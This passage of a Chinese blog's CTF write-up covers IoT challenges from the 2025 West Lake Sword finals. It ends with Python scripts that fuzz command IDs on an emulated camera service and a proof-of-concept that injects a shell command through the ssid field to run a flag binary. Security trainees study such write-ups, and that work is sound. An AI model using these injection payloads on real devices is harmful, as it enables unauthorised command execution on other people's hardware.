class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">        payload += <span class="string">b&quot;Accept: ./flag2 chall2\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">        payload += <span class="string">b&quot;Pragma: no-cache\r\n&quot;</span></span><br><span class="line">        payload += <span class="string">b&quot;Cache-Control: no-cache\r\n&quot;</span></span><br><span class="line">        </span><br><span class="line">        payload += <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        s.sendall(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        time.sleep(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Socket closed.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    raw_socket_request()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>执行poc后得到flag，DASCTF{bb5b6a80d630d1b4528b26d463bc1705}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204151630455.png"
+                      alt="image-20251204151630455"
+                ></p>
+<h2 id="pass-9-levels-9"><a href="#pass-9-levels-9" class="headerlink" title="pass_9_levels-9"></a>pass_9_levels-9</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204152350304.png"
+                      alt="image-20251204152350304"
+                ></p>
+<p>看启动信息可能是模拟了一个摄像头管理后台之类的，但由于没有前端可用，只开了个7519端口，具体服务接口需要我们手动去逆向分析</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205103751678.png"
+                      alt="image-20251205103751678"
+                ></p>
+<p>题目提示为json数据包，那么也就是说应该是用json传参</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205103828534.png"
+                      alt="image-20251205103828534"
+                ></p>
+<p>先fuzz一下看看哪些CMD ID可用</p>
+<div class="code-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuzz_cmd</span>(<span class="params">cmd_id</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;10.10.10.133&#x27;</span>, <span class="number">7519</span>))</span><br><span class="line">        </span><br><span class="line">        payload = json.dumps(&#123;<span class="string">&quot;CMD&quot;</span>: cmd_id, <span class="string">&quot;PARAM&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">        s.sendall(payload.encode())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> resp:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] CMD <span class="subst">&#123;cmd_id&#125;</span> Response: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Fuzzing CMD IDs...&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    fuzz_cmd(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到简单测试后能成功获得回显</p>
+<p>CMD 0是get了一些信息，那么肯定会有set的逻辑</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202094619157.png"
+                      alt="image-20251202094619157"
+                ></p>
+<p>而在查找system的引用后，我们可以看到更新ssid的函数疑似会存在命令注入漏洞</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205104058391.png"
+                      alt="image-20251205104058391"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205105433537.png"
+                      alt="image-20251205105433537"
+                ></p>
+<p>我们先字符串定位到处理处理ID 0的函数，下一步就是在尾部下断点看看是哪里调用了它</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205104020110.png"
+                      alt="image-20251205104020110"
+                ></p>
+<p>利用qemu仿真，功能基本上能正常使用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203192338508.png"
+                      alt="image-20251203192338508"
+                ></p>
+<p>处理ID 0的函数结束后，来到了到cmd_handle的处理函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203195925915.png"
+                      alt="image-20251203195925915"
+                ></p>
+<p>在存放cmd_handler的链表中，可以找到关于ssid的处理函数对应的CMD ID为0x44</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203195851465.png"
+                      alt="image-20251203195851465"
+                ></p>
+<p>发送测试payload，可以看到成功拼接了我们发送过去的ssid并执行命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203200249450.png"
+                      alt="image-20251203200249450"
+                ></p>
+<p>用一个echo测试一下，在真机上成功执行命令，没有做任何过滤</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203200850011.png"
+                      alt="image-20251203200850011"
+                ></p>
+<p>poc</p>
+<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def <span class="title function_">send_exploit</span><span class="params">(cmd_id, ssid_payload)</span>:</span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">5</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;10.10.10.133&#x27;</span>, <span class="number">7519</span>))</span><br><span class="line">        </span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;CMD&quot;</span>: cmd_id,</span><br><span class="line">            <span class="string">&quot;PARAM&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;ssid&quot;</span>: ssid_payload,</span><br><span class="line">                <span class="string">&quot;phrase&quot;</span>: <span class="string">&quot;twogoat&quot;</span> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        payload = json.dumps(data)</span><br><span class="line">        print(f<span class="string">&quot;[+] Sending Exploit to CMD &#123;cmd_id&#125;: &#123;payload&#125;&quot;</span>)</span><br><span class="line">        s.sendall(payload.encode())</span><br><span class="line">        </span><br><span class="line">        resp = s.recv(<span class="number">1024</span>)</span><br><span class="line">        print(f<span class="string">&quot;[+] Response: &#123;resp.decode(errors=&#x27;ignore&#x27;)&#125;&quot;</span>)</span><br><span class="line">        s.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f<span class="string">&quot;[-] Error: &#123;e&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;twogoat&#x27;;./flag3 chall3;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">send_exploit(<span class="number">0x44</span>, cmd)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>执行payload后成功生成flag，DASCTF{49d5dcfde3f105311ee6edeb766ae8ba}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204152011060.png"
+                      alt="image-20251204152011060"
+                ></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 西湖论剑2025决赛IOT安全挑战(漏洞挖掘部分)</li>
+        <li><strong>作者:</strong> 两只羊</li>
+        <li><strong>创建于
+                :</strong> 2025-12-05 10:08:59</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-12-05 11:04:40
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://twogoat.github.io/2025/12/05/2025西湖论剑决赛IOT安全挑战-漏洞挖掘部分/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/IOT/">#IOT</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/CTF/">#CTF</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/12/05/CVE-2017-17215-%E4%BB%8E%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E5%88%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">CVE-2017-17215 从固件提取到漏洞利用</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/10/27/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%88%9D%E8%B5%9B-Mobile%E6%96%B9%E5%90%91just-Writeup/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">强网拟态2025初赛 Mobile方向just Writeup</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          recaptchaV3Key: "wasd",
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">西湖论剑2025决赛IOT安全挑战(漏洞挖掘部分)</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9E%E6%8E%A5%E6%A0%91%E8%8E%93%E6%B4%BE"><span class="nav-text">连接树莓派</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-9-levels-7"><span class="nav-text">pass_9_levels-7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-9-levels-8"><span class="nav-text">pass_9_levels-8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pass-9-levels-9"><span class="nav-text">pass_9_levels-9</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">两只羊</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 15 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
